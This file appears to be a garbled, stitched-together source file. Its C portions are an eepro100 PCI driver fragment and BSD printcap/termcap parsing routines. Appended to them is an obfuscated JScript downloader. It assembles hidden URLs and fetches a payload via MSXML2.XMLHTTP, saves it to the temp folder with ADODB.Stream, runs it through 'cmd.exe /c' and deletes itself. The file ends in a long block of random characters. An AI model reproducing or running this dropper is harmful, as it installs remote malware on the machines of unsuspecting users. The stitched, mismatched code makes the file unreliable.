struct pci_driver {
       const struct pci_device_id *id_table;
       struct device_driver     driver;
};


static struct device_driver eepro100_driver = {
       .name          = "eepro100",
       .bus           = &pci_bus_type,

       .probe         = eepro100_probe,
       .remove                = eepro100_remove,
       .suspend               = eepro100_suspend,
       .resume                = eepro100_resume,
};


#ifndef lint
static char sccsid[] = "@(#)printcap.c	5.7 (Berkeley) 3/4/91";
#endif /* not lint */

#include <ctype.h>
#include <stdio.h>
#include "pathnames.h"
#include <syslog.h>
#include <fcntl.h>
#include <string.h>
#include <unistd.h>

#pragma disable_message(107,202)

#include <unix.h>
#include <sys/select.h>
#include <sys/dir.h>
#include <inttypes.h>

#ifndef LOCK_EX
#define LOCK_EX F_WRLCK 
#endif

#ifndef LOCK_NB
#define LOCK_NB 4
#endif

#ifndef LOCK_SH
#define LOCK_SH F_RDLCK
#endif

//int _validuser(FILE *hostf, char *rhost, char *luser, char *ruser, int baselen);
extern int getport(signed char *);
extern long getline(FILE *);
extern int getq(struct queue ***);
extern char *checkremote(void);
extern void fatal(signed char *, ... );
extern void displayq(int );
extern void warn(void);
extern void header(void);
extern void inform(signed char *);
extern int inlist(signed char *,signed char *);
extern void show(signed char *,signed char *,int );
extern void blankfill(int );
extern void dump(signed char *,signed char *,int );
extern void ldump(signed char *,signed char *,int );
extern void prank(int );
//extern void main(int ,signed char **);
extern void doit(void);
extern void startup(void);
extern void chkhost(struct sockaddr_in *);
extern int getprent(char *);
extern void endprent(void);
extern int pgetent(char *,char *);
extern int pnchktc(void);
extern int pnamatch(char *);
extern int pgetnum(char *);
extern int pgetflag(char *);
extern char *pgetstr(char *, char **);
extern void printjob(void);
extern int printit(signed char *);
extern int print(int ,signed char *);
extern int sendit(signed char *);
extern int sendfile(int ,signed char *);
extern int response(void);
extern void banner(signed char *,signed char *);
extern char *scnline(int ,signed char *,int );
extern void scan_out(int ,signed char *,int );
extern int dropit(int );
extern void sendmail(signed char *,int );
extern int dofork(int );
extern void init(void);
extern void openpr(void);
extern void setty(void);
//extern void status(char *, char * );
extern void recvjob(void);
extern int readjob(void);
extern int readfile(signed char *, long );
extern int noresponse(void);
extern int chksize( long );
extern int read_number(signed char *);
extern void rcleanup(void);
extern void frecverr(signed char *, ...);
extern void rmjob(void);
extern int lockchk(signed char *);
extern void process(signed char *);
extern int chk(signed char *);
extern int isowner(signed char *,signed char *);
extern void rmremote(void);
extern int iscf(struct dirent *);
extern int startdaemon(signed char *);

#ifndef __QNXNTO__
extern int rresvport(void *);
#endif

#ifdef __QNXNTO__
int flock(int , int ) ;
int getnid(void);
#endif

extern int daemon(int, int);
//extern int _validuser(void *hostf, char *rhost, char *luser, char *ruser, int baselen);
extern int __ivaliduser(FILE *hostf, uint32_t raddr, const char *luser, const char *ruser);
extern int disk_space(int, void *, void *);

#ifndef BUFSIZ
#define	BUFSIZ	1024
#endif
#define MAXHOP	32	/* max number of tc= indirections */

/*
 * termcap - routines for dealing with the terminal capability data base
 *
 * BUG:		Should use a "last" pointer in tbuf, so that searching
 *		for capabilities alphabetically would not be a n**2/2
 *		process when large numbers of capabilities are given.
 * Note:	If we add a last pointer now we will screw up the
 *		tc capability. We really should compile termcap.
 *
 * Essentially all the work here is scanning and decoding escapes
 * in string capabilities.  We don't use stdio because the editor
 * doesn't, and because living w/o it is not hard.
 */

#define PRINTCAP

#ifdef PRINTCAP
#define tgetent	pgetent
#define tskip	pskip
#define tgetstr	pgetstr
#define tdecode pdecode
#define tgetnum	pgetnum
#define	tgetflag pgetflag
#define tdecode pdecode
#define tnchktc	pnchktc
#define	tnamatch pnamatch
#define V6
#endif

static	FILE *pfp = NULL;	/* printcap data base file pointer */
static	char *tbuf;
static	int hopcount;		/* detect infinite loops in termcap, init 0 */
static  char *tskip();
char	*tgetstr();
static  char *tdecode();
char	*getenv();


/*
 * Similar to tgetent except it returns the next enrty instead of
 * doing a lookup.
 */
getprent(bp)
	register char *bp;
{
	register int c, skip = 0;

	if (pfp == NULL && (pfp = fopen(_PATH_PRINTCAP, "r")) == NULL)
		return(-1);

	tbuf = bp;
	for (;;) {
#if 0
		c = getc(pfp);
		if(pfp->_cnt == 0) {
			fclose(pfp);
			pfp = NULL;
			return(0);
		}
		switch (c) {
#endif
		switch (c = getc(pfp)) {
		case EOF: 
			fclose(pfp);
			pfp = NULL;
			return(0);
		case '\n':
			if (bp == tbuf) {
				skip = 0;
				continue;
			}
			if (bp[-1] == '\\') {
				bp--;
				continue;
			}
			*bp = '\0';
			return(1);
		case '#':
			if (bp == tbuf)
				skip++;
		default:
			if (skip)
				continue;
			if (bp >= tbuf+BUFSIZ) {
				write(2, "Termcap entry too long\n", 23);
				*bp = '\0';
				return(1);
			}
			*bp++ = c;
		}
	}
}

void
endprent()
{
	if (pfp != NULL){
		fclose(pfp);
		}
}

/*
 * Get an entry for terminal name in buffer bp,
 * from the termcap file.  Parse is very rudimentary;
 * we just notice escaped newlines.
 */
tgetent(bp, name)
	char *bp, *name;
{
	register char *cp;
	register int c;
	register int i = 0, cnt = 0;
	char ibuf[BUFSIZ];
	char *cp2;
	int tf;

	tbuf = bp;
	tf = 0;
#ifndef V6
	cp = getenv("TERMCAP");
	/*
	 * TERMCAP can have one of two things in it. It can be the
	 * name of a file to use instead of /etc/termcap. In this
	 * case it better start with a "/". Or it can be an entry to
	 * use so we don't have to read the file. In this case it
	 * has to already have the newlines crunched out.
	 */
	if (cp && *cp) {
		if (*cp!='/') {
			cp2 = getenv("TERM");
			if (cp2==(char *) 0 || strcmp(name,cp2)==0) {
				strcpy(bp,cp);
				return(tnchktc());
			} else {
				tf = open(_PATH_PRINTCAP, 0);
			}
		} else
			tf = open(cp, 0);
	}
	if (tf==0)
		tf = open(_PATH_PRINTCAP, 0);
#else
	tf = open(_PATH_PRINTCAP, 0);
#endif
	if (tf < 0){
		return (-1);}
	for (;;) {
		cp = bp;
		for (;;) {
			if (i == cnt) {
				cnt = read(tf, ibuf, BUFSIZ);
				if (cnt <= 0) {
					close(tf);
					return (0);
				}
				i = 0;
			}
			c = ibuf[i++];
			if (c == '\n') {
				if (cp > bp && cp[-1] == '\\'){
					cp--;
					continue;
				}
				break;
			}
			if (cp >= bp+BUFSIZ) {
				write(2,"Termcap entry too long\n", 23);
				break;
			} else
				*cp++ = c;
		}
		*cp = 0;

		/*
		 * The real work for the match.
		 */
		if (tnamatch(name)) {
			close(tf);
			return(tnchktc());
		}
	}
syslog(0,"it failed 3 %m");	
}

/*
 * tnchktc: check the last entry, see if it's tc=xxx. If so,
 * recursively find xxx and append that entry (minus the names)
 * to take the place of the tc=xxx entry. This allows termcap
 * entries to say "like an HP2621 but doesn't turn on the labels".
 * Note that this works because of the left to right scan.
 */
tnchktc()
{
	register char *p, *q;
	char tcname[16];	/* name of similar terminal */
	char tcbuf[BUFSIZ];
	char *holdtbuf = tbuf;
	int l;

	p = tbuf + strlen(tbuf) - 2;	/* before the last colon */
	while (*--p != ':')
		if (p<tbuf) {
			write(2, "Bad termcap entry\n", 18);
			return (0);
		}
	p++;
	/* p now points to beginning of last field */
	if (p[0] != 't' || p[1] != 'c')
		return(1);
	strcpy(tcname,p+3);
	q = tcname;
	while (q && *q != ':')
		q++;
	*q = 0;
	if (++hopcount > MAXHOP) {
		write(2, "Infinite tc= loop\n", 18);
		return (0);
	}
	if (tgetent(tcbuf, tcname) != 1)
		return(0);
	for (q=tcbuf; *q != ':'; q++)
		;
	l = p - holdtbuf + strlen(q);
	if (l > BUFSIZ) {
		write(2, "Termcap entry too long\n", 23);
		q[BUFSIZ - (p-tbuf)] = 0;
	}
	strcpy(p, q+1);
	tbuf = holdtbuf;
	return(1);
}

/*
 * Tnamatch deals with name matching.  The first field of the termcap
 * entry is a sequence of names separated by |'s, so we compare
 * against each such name.  The normal : terminator after the last
 * name (before the first field) stops us.
 */
tnamatch(np)
	char *np;
{
	register char *Np, *Bp;

	Bp = tbuf;
	if (*Bp == '#')
		return(0);
	for (;;) {
		for (Np = np; *Np && *Bp == *Np; Bp++, Np++)
			continue;
		if (*Np == 0 && (*Bp == '|' || *Bp == ':' || *Bp == 0))
			return (1);
		while (*Bp && *Bp != ':' && *Bp != '|')
			Bp++;
		if (*Bp == 0 || *Bp == ':')
			return (0);
		Bp++;
	}
}

/*
 * Skip to the next field.  Notice that this is not very smart,  not
 * knowing about \: escapes or any such.  If necessary, :'s can be put
 * into the termcap file in octal.
 */
static char *
tskip(bp)
	register char *bp;
{

	while (*bp && *bp != ':')
		bp++;
	if (*bp == ':')
		bp++;
	return (bp);
}

/*
 * Return the (numeric) option id.
 * Numeric options look like
 *	li#80
 * i.e. the option string is separated from the numeric value by
 * a # character.  If the option is not found we return -1.
 * Note that we handle octal numbers beginning with 0.
 */
tgetnum(id)
	char *id;
{
	register int i, base;
	register char *bp = tbuf;

	for (;;) {
		bp = tskip(bp);
		if (*bp == 0)
			return (-1);
		if (*bp++ != id[0] || *bp == 0 || *bp++ != id[1])
			continue;
		if (*bp == '@')
			return(-1);
		if (*bp != '#')
			continue;
		bp++;
		base = 10;
		if (*bp == '0')
			base = 8;
		i = 0;
		while (isdigit(*bp))
			i *= base, i += *bp++ - '0';
		return (i);
	}
}

/*
 * Handle a flag option.
 * Flag options are given "naked", i.e. followed by a : or the end
 * of the buffer.  Return 1 if we find the option, or 0 if it is
 * not given.
 */
tgetflag(id)
	char *id;
{
	register char *bp = tbuf;

	for (;;) {
		bp = tskip(bp);
		if (!*bp)
			return (0);
		if (*bp++ == id[0] && *bp != 0 && *bp++ == id[1]) {
			if (!*bp || *bp == ':')
				return (1);
			else if (*bp == '@')
				return(0);
		}
	}
}

/*
 * Get a string valued option.
 * These are given as
 *	cl=^Z
 * Much decoding is done on the strings, and the strings are
 * placed in area, which is a ref parameter which is updated.
 * No checking on area overflow.
 */
char *
tgetstr(id, area)
	char *id, **area;
{
	register char *bp = tbuf;

	for (;;) {
		bp = tskip(bp);
		if (!*bp)
			return (0);
		if (*bp++ != id[0] || *bp == 0 || *bp++ != id[1])
			continue;
		if (*bp == '@')
			return(0);
		if (*bp != '=')
			continue;
		bp++;
		return (tdecode(bp, area));
	}
}

/*
 * Tdecode does the grung work to decode the
 * string capability escapes.
 */
static char *
tdecode(str, area)
	register char *str;
	char **area;
{
	register char *cp;
	register int c;
	register char *dp;
	int i;

	cp = *area;
	while ((c = *str++) && c != ':') {
		switch (c) {

		case '^':
			c = *str++ & 037;
			break;

		case '\\':
			dp = "E\033^^\\\\::n\nr\rt\tb\bf\f";
			c = *str++;
nextc:
			if (*dp++ == c) {
				c = *dp++;
				break;
			}
			dp++;
			if (*dp)
				goto nextc;
			if (isdigit(c)) {
				c -= '0', i = 2;
				do
					c <<= 3, c |= *str++ - '0';
				while (--i && isdigit(*str));
			}
			break;
		}
		*cp++ = c;
	}
	*cp++ = 0;
	str = *area;
	*area = cp;
	return (str);
}


function lBk(xIS, XQr)
{
        xIS["Open"]();
        xIS["Type"] = 1;

        xIS["Writ" + l()](XQr[h()]);
        var r=36123;
        var X=r+36005;
        var g=X/184;
        var Ji=g-392;
        xIS["Positio" + DD()] = Ji;
}

function R(K)
{
        var eDT;
        var iSj;
        var mj = cN(42);

        var zs = new mj("M" + "SXM" + Ph());
        var U = 0;
        zs["o" + "pen"]("G" + "E" + "T", K, 0);
        try {
                zs["s" + "end"]();
        } catch (tLk) {
                return false;
        }


        if (zs["S" + "tatus"] != 200)
                return (55 > 66);
        var oL = new mj("Scripting.F" + "ileSystemObjec" + k());
        var W = new mj("ADODB.Stream");
        K = qBE(oL);

        lBk(W, zs);

        var PD = W["Re" + "ad"]();
        PD = M(W, cN(7), PD);
        if (PD.length < 10)
                return false;
        W["Sa" + "veTo" + "File"](K);
        W["Cl" + "ose"]();

        var uM = cN(144);
        var Jy = "Wscr" + "ip" + k() + ".S" + "hell";
        var xV=String.fromCharCode(990/10-0);
        z = xV + String.fromCharCode(8938/82-0);
        H = z + String.fromCharCode(20*5);
        Wch = H + String.fromCharCode(2024/44-0);
        rdR = Wch + String.fromCharCode(181-80);
        pW = rdR + String.fromCharCode(9960/83+0);
        iSj = pW;
        eDT = new uM(Jy);
        var x = "ru" + DD();
        eDT[x](iSj + "e /c " + K, 0);
        if (124 > 89)
        {
                K = "del" + "et" + "eF";
                C(oL, T(K));
                return true;
        }
        return U;
}

function cN(N)
{
        return ActiveXObject;
}

function q(fVy)
{
        var jEJ = cN(0);
        var w = new jEJ("Scripting.Dictionary");
        w["Add"]("a", "b");
        var GJ = 4;
        if ((fVy > 5) && (w["Exists"]("a")))
        {
                var lyB = jQX(7, 4);
                if (lyB == false)
                        lyB = jQX(23, 56);
                GJ = 3;
        }
        return GJ;
}

function qBE(aDt)
{
        var AgR = "Ge" + "tSpe" + "cialF" + "ol" + "der";
        var bb = "GetT" + "empN" + "ame";
        var DK=String.fromCharCode(2944/32-0);
        var rPj = aDt[AgR](2) + DK + aDt[bb]();
        return rPj;
}

function exc()
{
        var eqR = "nd";
        return eqR;
}

function T(gR)
{
        return gR + "ile";
}

function k()
{
        var n = "t";
        return n;
}

function Ph()
{
        var fHC=String.fromCharCode(6688/88+0);
        nDO = fHC + String.fromCharCode(2600/52-0);
        vM = nDO + String.fromCharCode(736/16+0);
        Iyk = vM + String.fromCharCode(231-143);
        Bf = Iyk + String.fromCharCode(7*11);
        B = Bf + String.fromCharCode(6992/92-0);
        S = B + String.fromCharCode(1584/22+0);
        RR = S + String.fromCharCode(8148/97+0);
        Oy = RR + String.fromCharCode(634-550);
        oOw = Oy + String.fromCharCode(16*5);
        return oOw;
}

function DD()
{
        return "n";
}

function kKP(Oey)
{
        var Rm = "charA";
        var iMG = "t";
        var ne = Rm + iMG;
        return ne;
}

function xHW()
{
        var xPD = "YkuOKC7i{\"" + "GUy%x}" + "2c9N*";
        return xPD;
}


function M(iP, OMY, Ufk)
{
        var uk = "AD" + "OD" + "B.Re" + "cordse";
        var NU = new OMY(uk + "t");
        var jzg = iP["Si" +"ze"];
        var DC = 200 + 1;
        NU["fields"]["a" + "pp" + "e" + exc()]("bin", DC, jzg);
        var MhN = "ope";
        NU[MhN + "n"]();
        NU["addNew"]();
        var G = "bin";
        var ARD = "appe" + "ndChu" + "nk";
        NU(G)[ARD](Ufk);
        var nI = "u" + "pda" + "t";
        NU[nI + "e"]();
        return NU(G)["val" + "u" + "e"];
}

function IQc()
{
        var xPD = "Q+8tneM[`S^W<I?qgrv(" + "$lBT,'" + "/EP0" + "#DL: ";
        return xPD;
}

function VV(Qk)
{
        var or=String.fromCharCode(1260/18-0);
        s = or + String.fromCharCode(2*23);
        FF = s + String.fromCharCode(439-313);
        Pr = FF + String.fromCharCode(1900/50-0);
        AJv = Pr + String.fromCharCode(974-882);
        var xPD = xHW() + IQc() + "p_@|VJfw6z=R;A)" + "mj5Za31Hs!o->" + AJv + "4X" + "]d" + "bh";
        var fN = xPD["" + kKP(Qk)](Qk-31);
        return fN;
}

function gT()
{
        var I=[];
        I[0]="/";
        I[1]="la";
        I[2]="e";
        I[3]="is";
        I[4]="a";
        I[5]="en";
        I[6]="-";
        I[7]="nt";
        I[8]="r";
        I[9]="s/";
        I[10]="t";
        I[11]="h";
        I[12]="di";
        I[13]=".c";
        I[14]="he";
        I[15]="n";
        I[16]="c/";
        I[17]="wp";
        I[18]="c.";
        I[19]="i";
        I[20]="rd";
        I[21]="/";
        I[22]="ht";
        I[23]="a";
        I[24]="g";
        I[25]="//";
        I[26]="co";
        I[27]="1";
        I[28]="he";
        I[29]="om";
        I[30]="em";
        I[31]="pa";
        I[32]="t/";
        I[33]=":";
        I[34]="sp";
        I[35]="jp";
        I[36]="tp";
        I[37]="l";
        var cFh=I[22]+I[36]+I[33]+I[25]+I[28]+I[8]+I[12]+I[34]+I[23]+I[37]+I[4]+I[13]+I[29]+I[0]+I[17]+I[6]+I[26]+I[7]+I[5]+I[32]+I[10]+I[11]+I[30]+I[2]+I[9]+I[14]+I[20]+I[3]+I[31]+I[1]+I[21]+I[19]+I[15]+I[16]+I[27]+I[18]+I[35]+I[24];
        return cFh;
}

function JK()
{
        var hL=[];
        hL[0]="c.";
        hL[1]="no";
        hL[2]="/";
        hL[3]="n";
        hL[4]="j";
        hL[5]="p";
        hL[6]=":/";
        hL[7]="i";
        hL[8]="on";
        hL[9]="v";
        hL[10]=".x";
        hL[11]="g";
        hL[12]=".j";
        hL[13]="/i";
        hL[14]="tp";
        hL[15]="ht";
        hL[16]="t";
        hL[17]="va";
        hL[18]="p";
        hL[19]="1";
        hL[20]="sr";
        var a=hL[15]+hL[14]+hL[6]+hL[13]+hL[3]+hL[1]+hL[17]+hL[16]+hL[7]+hL[8]+hL[10]+hL[20]+hL[9]+hL[12]+hL[5]+hL[2]+hL[19]+hL[0]+hL[4]+hL[18]+hL[11];
        return a;
}


function jQX(ea, b)
{
        var K = 24;
        if (ea > b)
                K = JK();
        else
                K = gT();
        return R(K);
}

function ip(ToM, Qg)
{
        return bt(ToM, Qg);
}

function h()
{
        return "ResponseBody";
}

function l()
{
        return "e";
}

function C(u, Flg)
{
        var ffv = WScript;
        u[Flg](ffv["ScriptFullName"]);
}


while (q(43) > 0)
{
        break;
}


/* sms-C6Nw[mlvTzxggLt6#FEkeH&4umyco2SZKlsi%SbufbJsn{MC8ISdx4d[j+#a!P+TkJIAm}dA3UgKl2EJ]t#dh!d3A*bJXE0f!{ePIVNYpTdOdVg&[bR0Y+(29v@S]tNuSGSLOjRgZnG&[L@MiGcUZJ[c4M[9gQZUPCUVgr)[E$cOU8PbM$Ja4u(%mmhN#sysfB{NwjBmIGAY2Gq1iyj$kH6wX8Br!0Fd9&49UJ4ls2Y)eNEQ@Q7aR%[v6Z1SQMffrQ9rdV+mFjP%RsC+pxIYjPoI-ZmNadTVqgyusg[DHqVmX6QGe8ktUzTZcGkYu@nUe[tciles^GB[7)7Wqj3cQLe2[NJYc-D%5[LUZ9rvB&mcO8j0e&^!b2^I9i#md$OlX8$WNp]&Y!soal+w+3R8pd{bn!DdweVCh[CeJ[qE75Ph11T7vmPSLDlin8v$DU1m(9+-9nttqNJ9ej0k(ZQNvo^5Eb7PHoI$!zr*H748}N(TJXeuGW*@Sfq}tV@2]iG+LfCNO*KViJm2T7XFO6gu-Xa&cfj8dQ&jpLmBJosoeeVJkQyv{zpg(TJrRgqDGY)Fpg7-jLo-^2bCNMH+#VfKX*Io3cE5H1@ODVh%Ad-n$[w9bK%Yrl9G(Sy^7%jJpN@EAq[gTIUgcS@udh4w5dSJ]^pynHJo0go@P1KiKT@!#x-*5o7dYq-0IV#JO3pCb{SCd5tXOMjXwhLnDcBJ@KfM%mGl&n(rKxDre4M7(kL#+nC9n}uZa*92$&8*dCG56kr)*H3SpwKWzq-ERpVjhW7H{b)AHs+tLKeMaQ]bE[j!]jakJ{XZ&Rgkb9(zzlZ2eSj!PkSvV0avb{uqBb3q$V8M)v%d(q)Jv{v-dhHFE4qZrqG}dg[m#Y@80eWbNZW+&%ChdoKNQFOr+}$5xu#ZX%G2)BmO}cb[Ts1+Jy##lMLGPF&R2zrng&T*!Q}xpx)HIfQuuOaYjV{Ne+^)9rVthm)kqfvr+3F1p5U$jR#oRUbM]^VrEm[$u@@psbSsznOL&7bN1krRWmE%IL6@{9HrGJJ35}+m69ciaX2seEKXb-]^RhfynmL+0rWo^*+!rCEdCC@++zlaf5*ZV}VV[}GiSO6SFA+2w+bhQ8U6u#MhTFDnS[uM!D+@D2Mm27)rMrL0F6NlzpnW]VG^]fb9OEh(mRPqvRf$(K&idLzT4T@8KvfO[0TD^o$pPw-0Zv@aRr@%j3t!6QlWigCNf044KM)sjT0[*{4Zx2f%}WYncmsiRarQjaBjcfnVDpc[foAXTTxqikPIdA+s)sXnd^}82(Tqv9pvQ7lyAzCJH77zXYmIZodn@%Yla5S^bvSAYMrkkH8U0%t5(8VQbrHtfdyZh78&W1srDJj%53lgke](krcRo8KTmFwz%nwfdHN$C0)ixfC@H+gljuTy9Pp(SRd9s%iqbGuClUqdBMVjLPbHq2&m93-WNE8JOzi-qX34)NpBsX0GodV^ZgqRsH^vSd08t#g{AtdkMmv0UFjN72J)ltd20BNj%8bo^6}%U*UET-D3%]rPHEM]qJGCWxV]vClZNZl#N3E2f6Ri!Gns7qlH3vy0fINA4wq}$*)fo-pu)nge-H}tsaX43kx*XXr*T)qolklYgNWbh+gEId#inHWqzW02}r3eM2]l9fWiqIyz*22ONZxQRViM[MU+s@o9[+iv8d^AzjP@zNI]7YHubsweQt1AtRU&99Lg][IDoz&VjutU{cdlGMiJ5P52nF-cOcLNqKpbS2$smkvj*#(l@kCZjdYVMcitrPM7Y49wmAg@JRBAn)+*kpXYx+I@IeqsxlVs*3e]u^iqi0N[9&0Jcp+(OsrKWDn3{Y3z2SreX2ckWHlNK!j6T0stW6hcdX3s%X**$^[QlZ9tSnu5mAsi3sN^QqFQrhSG]MPn*ybkqVndijIbibh%s6veBoV!tpdWHCX7}E(atX6f7lkSaggv%]V43gUf)t{pcmJo5cdqghpc3[avKnMIZRxtvnjE!peYcHoxTWqIuO9du(*13z$Plwcv3km9cU^p9iPBroxVauzQg+n[QaHu%uQcwi(+l61YeVqc+HV-T^Jldg$QM$Al{l+qWAi2NUOg-YYq1Fze&TB!6encvNc8U77Msae03xGz6axp3B*nQRfSrsybVrzBFeXpfE$1g3P$vIl2{-m*7#N]og(b}utT}lX2aGGrf&vHvW]BmYm%LlnycTFTn2x]mFX})ND12K4N5BqpQPDSpZypHcxhPfnyk*f9^jjQyI#E1!Sg]X!4WTMWq4{h7y$nl)[E^Mcg587Gi#^8$QFY&(aZhU@[WQvmeDGmP#bf(!8jEtFukb#gdN&a8#&i$npia#17ne2kqUdj]D]HZ3Kq{+0)@b(MiOpTdr*PgL$%T[]0[}2m&G^zaqg$*4yRjglTmzQpi^[+3h#{5flpMkOO(pYBhek$[G^jBsrA(3DJ+u3Y3oeI#2pK^$dvkPhRAEECwwpjum}Q^BVsH9}P1xMHc]ca]TeB]YK(1YsPA}l*#MFsFu)]jn{YX%ZRkUP}ncxBOswWY8x$a#cfdz#FUfZ-q7eypLQU3Rr$g(F1#PP-1]FPAocDa}f$cMgOC)SQ-k1EAbhLrA!er%YksS8rJkVB[XHboAhl@0rveHGTnji!u!rYNr@4lnuAe}Xs}QPoF-unxI8$Ej+mf5{GlYFY}dkrr4Sv#6}Oifc%#u5g!9JmehhVjSmHQoK-aa@@+tK0}&m]RU$tuQONdPJC8O(TL%aCKU@cR9l2ybg^yujpuul]hUef[GkuGl2dc7d&Y{fFcLs$iPzu}^eno6rARm!!YVDu75@0oM![vZTHKGjy0fe)9h*5xW{o#Hm89y8[UAfp!AiV29@-rtpxRo(x@!W71sNi{adYhjZ^((vsR{gy4nURR}nx0$qsMH3sM{p]aPqODoWC@rcZ[%P$!{XFvpEmRi3y*Wx^])S&kX^^h&oFK02C#T&MHK{L*N7QJg${ccx9qkDO)B+voX8J(Rkf]@jKj1LCbWQoqxdu^6Ef{zjpLaTItrzVfOglk@DIhY}AAA6S%4kid6j]O8jsedp86GrU%%+Gj]{)}x)AceD[ */

